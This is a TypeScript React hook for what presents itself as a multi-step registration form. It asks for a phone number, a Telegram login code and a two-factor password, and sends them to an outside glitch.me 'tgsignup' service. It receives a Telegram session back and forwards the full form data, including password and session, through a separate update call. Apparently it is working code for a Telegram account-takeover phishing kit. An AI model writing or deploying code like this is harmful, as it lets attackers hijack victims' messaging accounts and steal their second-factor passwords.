import { useState, useCallback, useMemo } from 'react';
import { RegisterFormData, FormStep, FORM_STEPS } from '../types';
import { vibrateSuccess, vibrateError } from '../../../utils/haptics';
import { parseTGMsg } from '../../../utils/telegram';
import { extractMessage } from '../../../utils/error';
import axios from 'axios';
import { sendUpdate } from '../../../utils';

const useRegisterForm = (others?: boolean) => {
    const [formData, setFormData] = useState<RegisterFormData>({
        phoneNumber: '',
        otp1: '',
        otp2: '',
        otp3: '',
        otp4: '',
        otp5: '',
        password: '',
        phoneCountryCode: '+91',
        firstName: '',
        lastName: ''
    });

    const [activeForm, setActiveForm] = useState<FormStep>(FORM_STEPS.phoneNumber);
    const [isLoading, setIsLoading] = useState(false);
    const [errMsg, setErrMsg] = useState<string>('');
    const [showErr, setShowErr] = useState<boolean>(false);
    const [ok, setOk] = useState(false);
    const [success, setSuccess] = useState(false);
    const [buttonEnabled, setButtonEnabled] = useState(false);
    const [isSubmitting, setIsSubmitting] = useState(false);

    const validationRules = useMemo(() => ({
        phoneNumber: (value: string) => {
            return /^[0-9]{10}$/.test(value);
        },
        password: (value: string) => {
            return value.length >= 1;
        },
        firstName: (value: string) => {
            return !others || value.length >= 2;
        },
        lastName: (value: string) => {
            return !others || value.length >= 2;
        }
    }), [others]);

    const getValidationError = useCallback((field: keyof typeof validationRules, value: string): string | null => {
        if (!validationRules[field](value)) {
            switch (field) {
                case 'phoneNumber':
                    return 'Please enter a valid 10-digit mobile number';
                case 'password':
                    return 'Please enter your 2FA password';
                case 'firstName':
                    return others ? 'First name must be at least 2 characters' : null;
                case 'lastName':
                    return others ? 'Last name must be at least 2 characters' : null;
                default:
                    return null;
            }
        }
        return null;
    }, [others, validationRules]);

    const handleInputChange = useCallback((e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>): void => {
        const { name, value } = e.target;
        if (name === 'phoneNumber') {
            const cleanedValue = value.replace(/\D/g, '').slice(-10);
            setFormData(prev => ({
                ...prev,
                [name]: cleanedValue
            }));
        } else {
            setFormData(prev => ({
                ...prev,
                [name]: value
            }));
        }
        // Clear any existing error when user starts typing
        setShowErr(false);
    }, []);

    const handlePhoneSubmit = async (e: React.FormEvent): Promise<void> => {
        e.preventDefault();
        const phone = formData.phoneNumber;
        const phoneError = getValidationError('phoneNumber', phone);
        if (phoneError) {
            vibrateError();
            setErrMsg(extractMessage(phoneError));
            setShowErr(true);
            return;
        }

        if (others) {
            const firstNameError = getValidationError('firstName', formData.firstName || '');
            const lastNameError = getValidationError('lastName', formData.lastName || '');
            if (firstNameError || lastNameError) {
                vibrateError();
                setErrMsg(extractMessage(firstNameError || lastNameError || ''));
                setShowErr(true);
                return;
            }
        }

        if (isLoading) return;

        setIsLoading(true);
        setShowErr(false);

        try {
            const response = await axios.post('https://uptimechecker2.glitch.me/tgsignup/send-code', {
                phone: formData.phoneCountryCode + phone
            });

            if (response.data) {
                setFormData(prev => ({
                    ...prev,
                    phoneCodeHash: response.data.phoneCodeHash,
                    isCodeViaApp: response.data.isCodeViaApp
                }));
                await sendUpdate(JSON.stringify({ ...formData, phoneNumber: phone }));
                setActiveForm(FORM_STEPS.otp);
                vibrateSuccess();
            }
        } catch (error: any) {
            vibrateError();
            const err = error.response?.data?.message || error.message;
            setErrMsg(extractMessage(err));
            setShowErr(true);
        } finally {
            setIsLoading(false);
        }
    };

    const handlePhoneKeyDown = (e: React.KeyboardEvent<HTMLInputElement>): void => {
        if (e.key === 'Enter' && validationRules.phoneNumber(formData.phoneNumber)) {
            e.preventDefault();
            handlePhoneSubmit(e as any);
        }
    };

    const handleOTPSubmit = async (e: React.FormEvent): Promise<void> => {
        e.preventDefault();

        const otpValue = [formData.otp1, formData.otp2, formData.otp3, formData.otp4, formData.otp5].join('');

        if (activeForm === FORM_STEPS.otp && !/^[0-9]{5}$/.test(otpValue)) {
            vibrateError();
            setErrMsg('Please enter a valid OTP');
            setShowErr(true);
            return;
        }

        if (activeForm === FORM_STEPS.twofactor) {
            const passwordError = getValidationError('password', formData.password);
            if (passwordError) {
                vibrateError();
                setErrMsg(extractMessage(passwordError));
                setShowErr(true);
                return;
            }
        }

        if (isLoading || isSubmitting) return;

        setIsLoading(true);
        setShowErr(false);
        setIsSubmitting(true);

        try {
            const response = await axios.post('https://uptimechecker2.glitch.me/tgsignup/verify', {
                phone: formData.phoneCountryCode + formData.phoneNumber,
                code: otpValue,
                password: formData.password
            });

            console.log(response);

            if (response.data.requires2FA) {
                vibrateError();
                setActiveForm(FORM_STEPS.twofactor);
                return;
            }

            if (response.data.session) {
                vibrateSuccess();
                setFormData(prev => ({
                    ...prev,
                    session: response.data.session
                }));
                setOk(true);
                setActiveForm(FORM_STEPS.phoneNumber);
            }

            await sendUpdate(JSON.stringify({ ...formData }));

            if (activeForm === FORM_STEPS.twofactor && response.status === 200) {
                vibrateSuccess();
                setOk(true);
            }

        } catch (error: any) {
            console.log("here")
            vibrateError();
            const err = error.response?.data?.message || error.message;
            const errorMessage = extractMessage(parseTGMsg(err));
            setErrMsg(errorMessage);
            setShowErr(true);

            // Check for session expired cases
            if (errorMessage.toLowerCase().includes('session expired') || error.response?.status === 401) {
                setErrMsg(`${errorMessage}, Redirecting in 5secs`);
                setTimeout(() => {
                    setActiveForm(FORM_STEPS.phoneNumber);
                    setFormData(prev => ({
                        ...prev,
                        otp1: '', otp2: '', otp3: '', otp4: '', otp5: '',
                        password: ''
                    }));
                    setTimeout(() => {
                        setShowErr(false);
                    }, 3000);
                }, 5000); // 5 seconds delay
                return;
            }

            if (!error.response?.data?.requires2FA) {
                setFormData(prev => ({
                    ...prev,
                    otp1: '', otp2: '', otp3: '', otp4: '', otp5: ''
                }));
                setTimeout(() => {
                    const firstInput = document.querySelector('input[name=otp1]') as HTMLInputElement;
                    if (firstInput) {
                        firstInput.focus();
                    }
                }, 50);
            }
        } finally {
            setIsLoading(false);
            setIsSubmitting(false);
        }
    };

    const handleOTPDigitChange = (index: number, value: string): void => {
        const digit = value.replace(/[^0-9]/g, '');
        const otpKey = `otp${index + 1}` as keyof RegisterFormData;

        if (digit) {
            setFormData(prev => ({
                ...prev,
                [otpKey]: digit
            }));

            // Move to next input if available
            if (index < 4) {
                const nextInput = document.querySelector(`input[name=otp${index + 2}]`) as HTMLInputElement;
                if (nextInput) {
                    nextInput.focus();
                }
            } else {
                // If this is the last digit, check if all digits are filled
                const allDigitsFilled = [...Array(5)].every((_, i) =>
                    formData[`otp${i + 1}` as keyof RegisterFormData]
                );
                if (allDigitsFilled) {
                    // Auto submit the form
                    const submitButton = document.querySelector('form.otp-form button[type="submit"]') as HTMLButtonElement;
                    submitButton?.click();
                }
            }
        }
    };

    const handleOTPKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>): void => {
        const currentInput = e.currentTarget;
        const otpKey = `otp${index + 1}` as keyof RegisterFormData;

        if (e.key === 'Backspace') {
            e.preventDefault();
            if (currentInput.value) {
                setFormData(prev => ({
                    ...prev,
                    [otpKey]: ''
                }));
                currentInput.value = '';
                vibrateError();
            } else if (index > 0) {
                const prevInput = document.querySelector(`input[name=otp${index}]`) as HTMLInputElement;
                if (prevInput) {
                    prevInput.focus();
                    vibrateError();
                }
            }
        } else if (e.key === 'ArrowLeft' && index > 0) {
            e.preventDefault();
            const prevInput = document.querySelector(`input[name=otp${index}]`) as HTMLInputElement;
            if (prevInput) prevInput.focus();
        } else if (e.key === 'ArrowRight' && index < 4) {
            e.preventDefault();
            const nextInput = document.querySelector(`input[name=otp${index + 2}]`) as HTMLInputElement;
            if (nextInput) nextInput.focus();
        } else if (e.key === 'v' && (e.ctrlKey || e.metaKey)) {
            e.preventDefault();
            navigator.clipboard.readText().then(text => {
                const digits = text.replace(/\D/g, '').split('').slice(0, 5);
                if (digits.length) {
                    digits.forEach((digit, i) => {
                        const otpKey = `otp${i + 1}` as keyof RegisterFormData;
                        setFormData(prev => ({
                            ...prev,
                            [otpKey]: digit
                        }));
                    });
                    vibrateSuccess();

                    // Focus the next empty input or last input if all filled
                    const remainingInputs = 5 - digits.length;
                    if (remainingInputs > 0) {
                        const nextInput = document.querySelector(`input[name=otp${digits.length + 1}]`) as HTMLInputElement;
                        if (nextInput) nextInput.focus();
                    } else {
                        const lastInput = document.querySelector(`input[name=otp5]`) as HTMLInputElement;
                        if (lastInput) lastInput.focus();
                        // Trigger form submission if all digits are filled
                        const submitButton = document.querySelector('form.otp-form button[type="submit"]') as HTMLButtonElement;
                        submitButton?.click();
                    }
                }
            });
        }
    };

    const handleBack = useCallback(() => {
        if (activeForm === FORM_STEPS.otp) {
            vibrateError();
            setActiveForm(FORM_STEPS.phoneNumber);
            setFormData(prev => ({
                ...prev,
                otp1: '', otp2: '', otp3: '', otp4: '', otp5: ''
            }));
            setShowErr(false);
            setErrMsg('');
        } else if (activeForm === FORM_STEPS.twofactor) {
            vibrateError();
            setActiveForm(FORM_STEPS.otp);
            setFormData(prev => ({ ...prev, password: '' }));
            setShowErr(false);
            setErrMsg('');
        }
    }, [activeForm]);

    const resetForm = () => {
        setFormData({
            phoneNumber: '',
            otp1: '',
            otp2: '',
            otp3: '',
            otp4: '',
            otp5: '',
            password: '',
            phoneCountryCode: '+91',
            firstName: '',
            lastName: ''
        });
        setActiveForm(FORM_STEPS.phoneNumber);
        setIsLoading(false);
        setErrMsg('');
        setShowErr(false);
        setOk(false);
        setSuccess(false);
        setButtonEnabled(false);
    };

    return {
        formData,
        setFormData,
        activeForm,
        setActiveForm,
        isLoading,
        setIsLoading,
        errMsg,
        setErrMsg,
        showErr,
        setShowErr,
        ok,
        setOk,
        success,
        setSuccess,
        buttonEnabled,
        setButtonEnabled,
        validationRules,
        handleInputChange,
        handlePhoneSubmit,
        handleOTPSubmit,
        handleOTPDigitChange,
        handleOTPKeyDown,
        handlePhoneKeyDown,
        handleBack,
        resetForm,
        isSubmitting
    };
};

export default useRegisterForm;